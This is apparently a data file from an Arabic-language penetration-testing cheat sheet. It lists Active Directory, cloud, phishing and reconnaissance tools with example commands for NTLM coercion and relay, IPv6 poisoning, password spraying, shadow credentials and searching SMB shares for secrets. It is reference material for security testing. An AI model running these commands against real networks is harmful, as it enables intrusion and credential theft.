    tips: 'راجع ملفات SUID وCron jobs وsudo misconfigurations بدقة بعد الفحص.',
    related: ['lse', 'pspy', 'linux-exploit-suggester']
  },
  {
    id: 1576,
    name: 'winpeas',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'winPEASx64.exe',
    short: 'فحص مسارات رفع صلاحيات Windows',
    desc: 'أداة PEASS للويندوز لاكتشاف misconfigurations وامتيازات يمكن استغلالها.',
    options: [],
    examples: [
      { cmd: 'winPEASx64.exe quiet cmd windowscreds', desc: 'فحص سريع مع تركيز على بيانات الاعتماد' }
    ],
    tips: 'قارن النتائج مع Seatbelt وPowerUp للحصول على رؤية أدق.',
    related: ['seatbelt', 'powerview', 'mimikatz']
  },
  {
    id: 1577,
    name: 'ligolo-ng',
    cat: 'pivoting',
    level: 'advanced',
    syntax: 'ligolo-proxy / ligolo-agent',
    short: 'Pivoting وتوجيه حركة المرور داخل الشبكات الداخلية',
    desc: 'حل tunneling حديث وسريع للتنقل الجانبي والوصول للشبكات الداخلية في اختبارات الاختراق.',
    options: [
      { flag: 'proxy -selfcert', desc: 'تشغيل البروكسي بشهادة ذاتية' },
      { flag: 'agent -connect <ip:port>', desc: 'ربط الـ agent بالبروكسي' }
    ],
    examples: [
      { cmd: 'ligolo-proxy -selfcert', desc: 'تشغيل proxy على جهاز المهاجم' },
      { cmd: 'ligolo-agent -connect 10.10.10.5:11601 -ignore-cert', desc: 'تشغيل agent على الجهاز الوسيط' }
    ],
    tips: 'أداؤه أفضل من SOCKS التقليدي في كثير من سيناريوهات الـ pivoting.',
    related: ['chisel', 'sshuttle', 'proxychains']
  },
  {
    id: 1578,
    name: 'pacu',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'pacu',
    short: 'إطار اختبار أمان AWS',
    desc: 'منصة هجومية لاختبار بيئات AWS واكتشاف أخطاء IAM وPrivilege Escalation السحابية.',
    options: [
      { flag: 'set_keys', desc: 'إعداد مفاتيح AWS' },
      { flag: 'run <module>', desc: 'تشغيل وحدة هجومية' }
    ],
    examples: [
      { cmd: 'pacu', desc: 'تشغيل Pacu بشكل تفاعلي' },
      { cmd: 'run iam__enum_permissions', desc: 'تعداد صلاحيات IAM' }
    ],
    tips: 'ابدأ دائماً بوحدات enumeration قبل أي عملية استغلال.',
    related: ['awscli', 'prowler', 'cloudsplaining']
  },
  {
    id: 1579,
    name: 'prowler',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'prowler aws [options]',
    short: 'تدقيق أمان AWS وCloud posture',
    desc: 'أداة تدقيق أمني لبيئات AWS تغطي CIS وBest Practices وتولد تقارير امتثال.',
    options: [
      { flag: 'aws', desc: 'وضع AWS' },
      { flag: '--compliance <framework>', desc: 'تطبيق إطار امتثال' },
      { flag: '--output-formats', desc: 'صيغ التقارير' }
    ],
    examples: [
      { cmd: 'prowler aws --compliance cis_1.5_aws --output-formats html json', desc: 'فحص امتثال AWS وإخراج تقارير متعددة' }
    ],
    tips: 'شغّله دورياً لمراقبة الانحرافات الأمنية في الحسابات السحابية.',
    related: ['pacu', 'cloudsplaining', 'trivy']
  },
  {
    id: 1580,
    name: 'cloudsplaining',
    cat: 'forensics',
    level: 'advanced',
    syntax: 'cloudsplaining scan --input-file <iam.json>',
    short: 'تحليل مخاطر سياسات AWS IAM',
    desc: 'يكشف أخطر أذونات IAM مثل Privilege Escalation وData Exfiltration في سياسات AWS.',
    options: [
      { flag: 'scan', desc: 'فحص ملف سياسات IAM' },
      { flag: '--input-file <file>', desc: 'ملف JSON للسياسات' },
      { flag: '--output <dir>', desc: 'مجلد التقرير' }
    ],
    examples: [
      { cmd: 'cloudsplaining scan --input-file iam-policies.json --output report', desc: 'تحليل سياسات IAM وإنتاج تقرير HTML' }
    ],
    tips: 'ممتاز كجزء من مراجعات Cloud Security قبل الإطلاق.',
    related: ['pacu', 'awscli', 'prowler']
  },
  {
    id: 1581,
    name: 'semgrep',
    cat: 'scripting',
    level: 'intermediate',
    syntax: 'semgrep scan --config <rules> <path>',
    short: 'SAST سريع لاكتشاف الثغرات في الشيفرة',
    desc: 'محرك تحليل ثابت للشيفرة يدعم قواعد جاهزة لأمن التطبيقات بمختلف اللغات.',
    options: [
      { flag: '--config <rule>', desc: 'قواعد الفحص' },
      { flag: '--json', desc: 'إخراج JSON' },
      { flag: '--severity <level>', desc: 'تصفية النتائج حسب الخطورة' }
    ],
    examples: [
      { cmd: 'semgrep scan --config p/owasp-top-ten src/', desc: 'فحص ثغرات OWASP Top 10 على المشروع' }
    ],
    tips: 'أفضل ممارسة: تشغيله ضمن CI لكل Pull Request.',
    related: ['bandit', 'eslint', 'sonarqube']
  },
  {
    id: 1582,
    name: 'enum4linux-ng',
    cat: 'network',
    level: 'intermediate',
    syntax: 'enum4linux-ng -A <target>',
    short: 'تعداد متقدم لخدمات SMB وActive Directory',
    desc: 'نسخة محسنة من enum4linux لاستخراج معلومات المستخدمين والمشاركات والسياسات من أهداف ويندوز.',
    options: [
      { flag: '-A', desc: 'تعداد شامل' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' }
    ],
    examples: [
      { cmd: 'enum4linux-ng -A 192.168.1.20', desc: 'تعداد كامل لخدمة SMB' }
    ],
    tips: 'مفيد جداً في أول مرحلة من اختبارات بيئات Active Directory.',
    related: ['smbmap', 'crackmapexec', 'rpcclient']
  },
  {
    id: 1583,
    name: 'pywerview',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'pywerview <module> [options]',
    short: 'PowerView ببايثون لتعداد Active Directory',
    desc: 'بديل PowerView بلغة Python لجمع معلومات AD بدون الاعتماد على PowerShell.',
    options: [
      { flag: 'get-netuser', desc: 'تعداد المستخدمين' },
      { flag: 'get-netgroup', desc: 'تعداد المجموعات' },
      { flag: '--dc-ip <ip>', desc: 'تحديد Domain Controller' }
    ],
    examples: [
      { cmd: 'pywerview get-netuser -w corp.local -u user -p pass --dc-ip 10.10.10.10', desc: 'تعداد مستخدمي الدومين' }
    ],
    tips: 'مفيد عند تقييد تنفيذ PowerShell في البيئات المستهدفة.',
    related: ['powerview', 'bloodhound', 'ldapdomaindump']
  },
  {
    id: 1584,
    name: 'ldapdomaindump',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'ldapdomaindump -u <domain\\user> -p <pass> <dc-ip>',
    short: 'استخراج بنية Active Directory عبر LDAP',
    desc: 'ينشئ تقارير HTML وJSON تحتوي المستخدمين والمجموعات والسياسات من Active Directory.',
    options: [
      { flag: '-u <user>', desc: 'المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-o <dir>', desc: 'مجلد الإخراج' }
    ],
    examples: [
      { cmd: 'ldapdomaindump -u corp\\audit -p "P@ssw0rd" 10.10.10.10 -o ldap_dump', desc: 'سحب بيانات الدومين' }
    ],
    tips: 'نتائجه مفيدة لبناء مسارات الهجوم داخل BloodHound.',
    related: ['bloodhound-python', 'pywerview', 'crackmapexec']
  },
  {
    id: 1585,
    name: 'adidnsdump',
    cat: 'recon',
    level: 'advanced',
    syntax: 'adidnsdump -u <domain\\user> -p <pass> <dc-ip>',
    short: 'تعداد سجلات DNS داخل Active Directory',
    desc: 'يستخرج سجلات DNS الداخلية من AD، مفيد لاكتشاف أنظمة داخلية غير معلنة.',
    options: [
      { flag: '-u <user>', desc: 'المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '--legacy', desc: 'وضع متوافق مع الإصدارات القديمة' }
    ],
    examples: [
      { cmd: 'adidnsdump -u corp\\audit -p "P@ssw0rd" 10.10.10.10', desc: 'استخراج سجلات DNS من AD' }
    ],
    tips: 'يساعد في اكتشاف السيرفرات الداخلية المخفية عن DNS العام.',
    related: ['dig', 'dnsx', 'ldapdomaindump']
  },
  {
    id: 1586,
    name: 'certsync',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'certsync -u <user> -p <pass> -dc-ip <ip> -domain <domain>',
    short: 'تعداد خدمات AD CS واكتشاف إساءات الشهادات',
    desc: 'أداة تركّز على اكتشاف نقاط الضعف في Active Directory Certificate Services.',
    options: [
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-dc-ip <ip>', desc: 'عنوان Domain Controller' }
    ],
    examples: [
      { cmd: 'certsync -u user -p pass -dc-ip 10.10.10.10 -domain corp.local', desc: 'فحص إعدادات AD CS الأساسية' }
    ],
    tips: 'استخدمه مع certipy لتقييم كامل لمسارات ESC.',
    related: ['certipy-ad', 'ldapdomaindump', 'bloodhound']
  },
  {
    id: 1587,
    name: 'coercer',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'coercer coerce -t <target> -l <listener>',
    short: 'إجبار الأنظمة على المصادقة نحو Listener محدد',
    desc: 'يستغل بروتوكولات MS-RPC لإجبار الهدف على إجراء مصادقة NTLM يمكن التقاطها أو إعادة استخدامها.',
    options: [
      { flag: 'coerce', desc: 'تنفيذ عملية coercion' },
      { flag: '-t <target>', desc: 'الهدف' },
      { flag: '-l <listener>', desc: 'جهاز الاستماع' }
    ],
    examples: [
      { cmd: 'coercer coerce -t 10.10.10.15 -l 10.10.10.5', desc: 'إجبار الهدف على NTLM authentication' }
    ],
    tips: 'يفيد في سيناريوهات NTLM relay داخل الشبكات الداخلية.',
    related: ['responder', 'ntlmrelayx', 'mitm6']
  },
  {
    id: 1588,
    name: 'petitpotam',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'PetitPotam.py -d <domain> -u <user> -p <pass> <listener> <target>',
    short: 'استغلال EFSRPC coercion في بيئات AD',
    desc: 'أداة تستغل ثغرات coercion عبر EFSRPC لإجبار السيرفرات على المصادقة خارجياً.',
    options: [
      { flag: '-d <domain>', desc: 'الدومين' },
      { flag: '-u <user>', desc: 'المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' }
    ],
    examples: [
      { cmd: 'python3 PetitPotam.py -d corp.local -u user -p pass 10.10.10.5 10.10.10.10', desc: 'تنفيذ coercion على الهدف' }
    ],
    tips: 'غالباً يُستخدم كجزء من سلسلة هجوم relay وليس كاستغلال منفرد.',
    related: ['coercer', 'ntlmrelayx', 'responder']
  },
  {
    id: 1589,
    name: 'krbrelayx',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'krbrelayx.py [options]',
    short: 'Kerberos relay toolkit لاختبارات AD',
    desc: 'أداة من Impacket لسيناريوهات relay والتلاعب بالمصادقة في بيئات Kerberos.',
    options: [
      { flag: '-t <target>', desc: 'الهدف' },
      { flag: '--delegate-access', desc: 'محاولة تفويض صلاحيات' }
    ],
    examples: [
      { cmd: 'python3 krbrelayx.py -t ldap://dc.corp.local --delegate-access', desc: 'محاولة relay إلى LDAP' }
    ],
    tips: 'يتطلب إعدادات AD معينة ليكون قابلاً للاستغلال.',
    related: ['impacket', 'ntlmrelayx', 'coercer']
  },
  {
    id: 1590,
    name: 'mitm6',
    cat: 'network',
    level: 'advanced',
    syntax: 'mitm6 -d <domain>',
    short: 'هجوم IPv6 MITM في شبكات Active Directory',
    desc: 'ينفذ rogue DHCPv6/DNS poisoning لالتقاط المصادقات وتوجيه الترافيك.',
    options: [
      { flag: '-d <domain>', desc: 'الدومين المستهدف' },
      { flag: '-i <interface>', desc: 'واجهة الشبكة' }
    ],
    examples: [
      { cmd: 'mitm6 -d corp.local -i eth0', desc: 'تشغيل MITM6 على الدومين' }
    ],
    tips: 'يستخدم غالباً مع ntlmrelayx للحصول على نتائج فعالة.',
    related: ['responder', 'ntlmrelayx', 'bettercap']
  },
  {
    id: 1591,
    name: 'responder-multirelay',
    cat: 'network',
    level: 'advanced',
    syntax: 'Responder.py -I <iface> -wrf',
    short: 'تهيئة Responder لسيناريوهات relay متعددة',
    desc: 'نمط استخدام متقدم لـ Responder يركز على التقاط هاشات NTLM وتشغيل relay workflows.',
    options: [
      { flag: '-I <iface>', desc: 'واجهة الشبكة' },
      { flag: '-w', desc: 'WPAD rogue proxy' },
      { flag: '-r', desc: 'إجابات rogue' },
      { flag: '-f', desc: 'Force auth responses' }
    ],
    examples: [
      { cmd: 'Responder.py -I eth0 -wrf', desc: 'تشغيل responder مع خيارات relay' }
    ],
    tips: 'اوقف SMB/HTTP servers عند الدمج مع ntlmrelayx لتجنب التعارض.',
    related: ['responder', 'ntlmrelayx', 'mitm6']
  },
  {
    id: 1592,
    name: 'evilginx2',
    cat: 'social-engineering',
    level: 'advanced',
    syntax: 'evilginx -p <phishlets_dir>',
    short: 'إطار Phishing متقدم لمحاكاة تسجيل الدخول',
    desc: 'أداة Red Team متقدمة لإنشاء صفحات تصيد تحاكي الخدمات الحقيقية واختبار مقاومة MFA.',
    options: [
      { flag: '-p <dir>', desc: 'مجلد phishlets' },
      { flag: '-developer', desc: 'وضع المطور' }
    ],
    examples: [
      { cmd: 'evilginx -p ./phishlets', desc: 'تشغيل Evilginx2 مع phishlets مخصصة' }
    ],
    tips: 'يستخدم فقط في اختبارات Red Team المرخصة بشكل قانوني.',
    related: ['setoolkit', 'gophish', 'modlishka']
  },
  {
    id: 1593,
    name: 'wafw00f',
    cat: 'web',
    level: 'beginner',
    syntax: 'wafw00f <url>',
    short: 'اكتشاف نوع WAF أمام تطبيقات الويب',
    desc: 'يتعرف على جدار الحماية المستخدم أمام الموقع لتحديد أسلوب الاختبار المناسب.',
    options: [
      { flag: '-a', desc: 'اختبار شامل لكل أنواع WAF' },
      { flag: '-v', desc: 'وضع تفصيلي' }
    ],
    examples: [
      { cmd: 'wafw00f https://target.com -a', desc: 'اكتشاف نوع WAF المحتمل' }
    ],
    tips: 'معرفة WAF مبكراً تساعدك على اختيار payloads أقل كشفاً.',
    related: ['whatweb', 'nmap', 'nikto']
  },
  {
    id: 1594,
    name: 'jaeles',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'jaeles scan -u <url> -s <signatures>',
    short: 'محرك Signature-based لاكتشاف ثغرات الويب',
    desc: 'يفحص تطبيقات الويب عبر signatures جاهزة وقابلة للتخصيص لاكتشاف ثغرات متعددة.',
    options: [
      { flag: 'scan', desc: 'بدء الفحص' },
      { flag: '-u <url>', desc: 'هدف واحد' },
      { flag: '-U <file>', desc: 'ملف أهداف' }
    ],
    examples: [
      { cmd: 'jaeles scan -U urls.txt -s ~/jaeles-signatures', desc: 'فحص قائمة URLs بالتواقيع' }
    ],
    tips: 'يعمل جيداً بعد جمع URLs من katana وgau.',
    related: ['nuclei', 'katana', 'ffuf']
  },
  {
    id: 1595,
    name: 'osmedeus',
    cat: 'recon',
    level: 'advanced',
    syntax: 'osmedeus scan -t <target>',
    short: 'منصة أتمتة شاملة لعمليات Bug Bounty',
    desc: 'إطار Workflow متكامل يجمع بين reconnaissance والفحص والتحقق ضمن pipeline واحدة.',
    options: [
      { flag: 'scan', desc: 'تشغيل مسار الفحص' },
      { flag: '-t <target>', desc: 'الهدف' },
      { flag: '--force', desc: 'إعادة التشغيل من البداية' }
    ],
    examples: [
      { cmd: 'osmedeus scan -t target.com', desc: 'تشغيل workflow أوتوماتيكي على الهدف' }
    ],
    tips: 'مناسب لاختبارات واسعة تتطلب تنسيق عدة أدوات في وقت قصير.',
    related: ['amass', 'nuclei', 'subfinder']
  },
  {
    id: 1596,
    name: 'kerbrute',
    cat: 'password',
    level: 'intermediate',
    syntax: 'kerbrute userenum -d <domain> --dc <ip> <users.txt>',
    short: 'تعداد مستخدمي Active Directory عبر Kerberos',
    desc: 'أداة سريعة لاكتشاف المستخدمين الصحيحين في الدومين عبر استجابات Kerberos.',
    options: [
      { flag: 'userenum', desc: 'تعداد المستخدمين' },
      { flag: '-d <domain>', desc: 'اسم الدومين' },
      { flag: '--dc <ip>', desc: 'عنوان Domain Controller' }
    ],
    examples: [
      { cmd: 'kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt', desc: 'فحص قائمة مستخدمين على AD' }
    ],
    tips: 'يمكن استخدامه أيضاً في Password Spraying بطريقة مقيدة.',
    related: ['crackmapexec', 'ldapdomaindump', 'nmap']
  },
  {
    id: 1597,
    name: 'sprayhound',
    cat: 'password',
    level: 'advanced',
    syntax: 'sprayhound -u <users> -p <password> -d <domain> --dc <ip>',
    short: 'Password spraying آمن نسبياً على بيئات AD',
    desc: 'ينفذ Password Spraying مع مراعاة سياسات القفل لتقليل المخاطر التشغيلية.',
    options: [
      { flag: '-u <file>', desc: 'ملف المستخدمين' },
      { flag: '-p <password>', desc: 'كلمة المرور المراد اختبارها' },
      { flag: '--delay <sec>', desc: 'تأخير بين المحاولات' }
    ],
    examples: [
      { cmd: 'sprayhound -u users.txt -p "Winter2026!" -d corp.local --dc 10.10.10.10 --delay 2', desc: 'Password spray منظم على AD' }
    ],
    tips: 'لا تستخدمه دون تصريح صريح لأن محاولة كلمات المرور قد تؤثر على الحسابات.',
    related: ['kerbrute', 'hydra', 'crackmapexec']
  },
  {
    id: 1598,
    name: 'pywhisker',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'pywhisker --target <user> --action add [options]',
    short: 'استغلال Shadow Credentials في Active Directory',
    desc: 'أداة للتعامل مع msDS-KeyCredentialLink في AD ضمن سيناريوهات Shadow Credentials.',
    options: [
      { flag: '--target <user>', desc: 'الحساب المستهدف' },
      { flag: '--action add', desc: 'إضافة KeyCredential' },
      { flag: '--dc-ip <ip>', desc: 'عنوان DC' }
    ],
    examples: [
      { cmd: 'pywhisker --target svc-backup --action add -u user -p pass -d corp.local --dc-ip 10.10.10.10', desc: 'اختبار Shadow Credentials على حساب خدمة' }
    ],
    tips: 'يجب تتبع كل تغيير وإزالته بعد الاختبار للحفاظ على سلامة البيئة.',
    related: ['certipy-ad', 'impacket', 'bloodyad']
  },
  {
    id: 1599,
    name: 'aquatone',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'cat hosts.txt | aquatone',
    short: 'لقطات شاشة وتجميع مرئي لأهداف الويب',
    desc: 'ينتج screenshots وتقارير لتسهيل فرز الأهداف الويب ضمن برامج Bug Bounty.',
    options: [
      { flag: '-ports <list>', desc: 'المنافذ المراد فحصها' },
      { flag: '-out <dir>', desc: 'مجلد النتائج' }
    ],
    examples: [
      { cmd: 'cat live_subdomains.txt | aquatone -ports 80,443,8080 -out aqua_report', desc: 'إنشاء تقرير بصري للخدمات الحية' }
    ],
    tips: 'يسرع تحديد الصفحات الواعدة التي تستحق اختباراً يدوياً عميقاً.',
    related: ['eyewitness', 'httpx', 'gowitness']
  },
  {
    id: 1600,
    name: 'sn1per',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'sniper -t <target> -m <mode>',
    short: 'إطار فحص شامل يجمع أدوات متعددة',
    desc: 'منصة أتمتة تجمع بين reconnaissance والفحص والثغرات في سيناريو واحد.',
    options: [
      { flag: '-t <target>', desc: 'الهدف' },
      { flag: '-m <mode>', desc: 'نوع الفحص (stealth, normal, full)' },
      { flag: '-o <dir>', desc: 'مجلد التقارير' }
    ],
    examples: [
      { cmd: 'sniper -t target.com -m full', desc: 'تشغيل فحص كامل متعدد المراحل' }
    ],
    tips: 'مفيد كبداية سريعة ثم يتم التحقق اليدوي للنتائج المهمة.',
    related: ['osmedeus', 'nmap', 'nuclei']
  },
  {
    id: 1601,
    name: 'manspider',
    cat: 'forensics',
    level: 'advanced',
    syntax: 'manspider.py -d <domain> -u <user> -p <pass>',
    short: 'البحث عن بيانات حساسة داخل مشاركات SMB',
    desc: 'أداة Red Team لفحص مشاركات SMB واكتشاف كلمات المرور والمفاتيح والبيانات الحساسة.',
    options: [
      { flag: '-d <domain>', desc: 'الدومين' },
      { flag: '-u <user>', desc: 'المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' }
    ],
    examples: [
      { cmd: 'python3 manspider.py -d corp.local -u audit -p "P@ssw0rd" --threads 20', desc: 'فحص سريع لمشاركات SMB بحثاً عن أسرار' }
    ],
    tips: 'حدد Regex patterns مخصصة (AWS keys, private keys) لرفع جودة النتائج.',
    related: ['smbmap', 'crackmapexec', 'gitleaks']
  }
];
